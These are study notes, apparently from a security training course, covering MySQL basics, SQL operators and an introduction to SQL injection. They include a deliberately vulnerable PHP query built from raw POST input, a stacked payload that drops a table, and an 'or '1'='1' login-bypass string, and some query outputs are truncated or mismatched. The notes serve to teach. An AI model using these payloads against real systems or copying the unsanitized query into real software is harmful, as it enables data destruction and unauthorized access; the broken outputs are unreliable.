# SQL Injection (SQLi)

# Some of the essential features of a DBMS include:

Feature	      Description
Concurrency	  A real-world application might have multiple users interacting with it simultaneously. A DBMS makes sure that these concurrent interactions succeed without corrupting or losing any data.
Consistency	  With so many concurrent interactions, the DBMS needs to ensure that the data remains consistent and valid throughout the database.
Security	    DBMS provides fine-grained security controls through user authentication and permissions. This will prevent unauthorized viewing or editing of sensitive data.
Reliability	  It is easy to backup databases and rolls them back to a previous state in case of data loss or a breach.
Structured    Query Language	SQL simplifies user interaction with the database with an intuitive syntax supporting various operations.

# Types of Databases

# Relational Databases

# A relational database is the most common type of database. It uses a schema, a template, to dictate the data structure stored in the database.
# For example, we can imagine a company that sells products to its customers having some form of stored knowledge about where those products go, to whom, and in what quantity.
# However, this is often done in the back-end and without obvious informing in the front-end. 

# Non-relational Databases

# A non-relational database (also called a NoSQL database) does not use tables, rows, and columns or prime keys, relationships, or schemas.
# Instead, a NoSQL database stores data using various storage models, depending on the type of data stored.
# Due to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible.
# Therefore, when dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing such data.

The above example can be represented using JSON as:

Code: json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}

# Intro to MySQL

# This module introduces SQL injection through MySQL, and it is crucial to learn more about MySQL and SQL to understand how SQL injections work and utilize them properly.
# Therefore, this section will cover some of MySQL/SQL's basics and syntax and examples used within MySQL/MariaDB databases.

# Connecting to MySQL

# Tables

# DBMS stores data in the form of tables. A table is made up of horizontal rows and vertical columns.
# The intersection of a row and a column is called a cell. Every table is created with a fixed set of columns, where each column is of a particular data type.

Code: sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );

mysql> SHOW TABLES;

| date_of_joining | date         |
+-----------------+--------------+
4 rows in set (0.00 sec)

# Table Properties

# Within the CREATE TABLE query, there are many properties that can be set for the table and each column.
# For example, we can set the id column to auto-increment using the AUTO_INCREMENT keyword, which automatically increments the id by one every time a new item is added to the table:

Code: sql
    id INT NOT NULL AUTO_INCREMENT,

Code: sql
    username VARCHAR(100) UNIQUE NOT NULL,

Code: sql
    date_of_joining DATETIME DEFAULT NOW(),

Code: sql
    PRIMARY KEY (id)

# The final CREATE TABLE query will be as follows:

Code: sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );

# SQL Statements

# INSERT Statement

INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');

# The example above shows how to add a new login to the logins table, with appropriate values for each column.
# However, we can skip filling columns with default values, such as id and date_of_joining. This can be done by specifying the column names to insert values into a table selectively:

INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');

# We inserted a username-password pair in the example above while skipping the id and date_of_joining columns.

# We can also insert multiple records at once by separating them with a comma:

INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');

# SELECT Statement

Code: sql
SELECT * FROM table_name;
SELECT * FROM logins;

# To rename a column, we can use RENAME COLUMN:

ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;

# We can also change a column's datatype with MODIFY:

ALTER TABLE logins MODIFY oldColumn DATE;

# We can drop a column using DROP:

ALTER TABLE logins DROP oldColumn;

# SQL Operators

# AND Operator
# The AND operator takes in two conditions and returns true or false based on their evaluation:

Code: sql
condition1 AND condition2

# The result of the AND operation is true if and only if both condition1 and condition2 evaluate to true:
  
mysql> SELECT 1 = 1 AND 'test' = 'test';

+---------------------------+
| 1 = 1 AND 'test' = 'test' |
+---------------------------+
|                         1 |
+---------------------------+
1 row in set (0.00 sec)

mysql> SELECT 1 = 1 AND 'test' = 'abc';

+--------------------------+
| 1 = 1 AND 'test' = 'abc' |
+--------------------------+
|                        0 |
+--------------------------+
1 row in set (0.00 sec)

# OR Operator

# The OR operator takes in two expressions as well, and returns true when at least one of them evaluates to true:

mysql> SELECT 1 = 1 OR 'test' = 'abc';

+-------------------------+
| 1 = 1 OR 'test' = 'abc' |
+-------------------------+
|                       1 |
+-------------------------+
1 row in set (0.00 sec)

mysql> SELECT 1 = 2 OR 'test' = 'abc';

+-------------------------+
| 1 = 2 OR 'test' = 'abc' |
+-------------------------+
|                       0 |
+-------------------------+
1 row in set (0.00 sec)

# NOT Operator

# The NOT operator simply toggles a boolean value 'i.e. true is converted to false and vice versa':

mysql> SELECT NOT 1 = 1;

+-----------+
| NOT 1 = 1 |
+-----------+
|         0 |
+-----------+
1 row in set (0.00 sec)

mysql> SELECT NOT 1 = 2;

+-----------+
| NOT 1 = 2 |
+-----------+
|         1 |
+-----------+
1 row in set (0.00 sec)

# Symbol Operators

# The AND, OR and NOT operators can also be represented as &&, || and !, respectively. The below are the same previous examples, by using the symbol operators:

mysql> SELECT 1 = 1 && 'test' = 'abc';

+-------------------------+
| 1 = 1 && 'test' = 'abc' |
+-------------------------+
|                       0 |
+-------------------------+
1 row in set, 1 warning (0.00 sec)

mysql> SELECT 1 = 1 || 'test' = 'abc';

+-------------------------+
| 1 = 1 || 'test' = 'abc' |
+-------------------------+
|                       1 |
+-------------------------+
1 row in set, 1 warning (0.00 sec)

mysql> SELECT 1 != 1;

+--------+
| 1 != 1 |
+--------+
|      0 |
+--------+
1 row in set (0.00 sec)

# Operators in queries

# Let us look at how these operators can be used in queries. The following query lists all records where the username is NOT john:

mysql> SELECT * FROM logins WHERE username != 'john';

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+

# Multiple Operator Precedence

# Here is a list of common operations and their precedence, as seen in the MariaDB Documentation:

https://mariadb.com/kb/en/operator-precedence/

Division (/), Multiplication (*), and Modulus (%)
Addition (+) and subtraction (-)
Comparison (=, >, <, <=, >=, !=, LIKE)
NOT (!)
AND (&&)
OR (||)

# Operations at the top are evaluated before the ones at the bottom of the list. Let us look at an example:

SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;

# he query has four operations: !=, AND, >, and -. From the operator precedence, we know that subtraction comes first, so it will first evaluate 3 - 2 to 1:

SELECT * FROM logins WHERE username != 'tom' AND id > 1;

# Next, we have two comparison operations, > and !=. Both of these are of the same precedence and will be evaluated together.
# So, it will return all records where username is not tom, and all records where the id is greater than 1, and then apply AND to return all records with both of these conditions:

mysql> select * from logins where username != 'tom' AND id > 3 - 2;

# Intro to SQL Injections

# What is an Injection?

# Injection occurs when an application misinterprets user input as actual code rather than a string, changing the code flow and executing it.
# This can occur by escaping user-input bounds by injecting a special character like ('), and then writing code to be executed, like JavaScript code or SQL in SQL Injections.
# Unless the user input is sanitized, it is very likely to execute the injected code and run it.

# Codigo sem higienização

Code: php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);

# In typical cases, the searchInput would be inputted to complete the query, returning the expected outcome. Any input we type goes into the following SQL query:

select * from logins where username like '%$searchInput'

# SQL Injection

Exemplo de código vulnerável

select * from logins where username like '%$searchInput'

# So, the final SQL query executed would be as follows:

select * from logins where username like '%1'; DROP TABLE users;'

# Syntax Errors

# The previous example of SQL injection would return an error:

Error: near line 1: near "'": syntax error

select * from logins where username like '%1'; DROP TABLE users;'

# Tipos de SQL Injection:

- In-Band
-- Union Based
-- Error Based

- Blind
-- Boolean Based
-- Time Based

- Out-of-band

# Exemplo de query quando não sabemos o usuário

SELECT * FROM logins WHERE username=" or '1'='1' AND password = " or '1'='1';

# Using Comments

# Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query.
# We can use two types of line comments with MySQL -- and #, in addition to an in-line comment /**/ (though this is not usually used in SQL injections). The -- can be used as follows:

mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |

# Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL.
# In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.
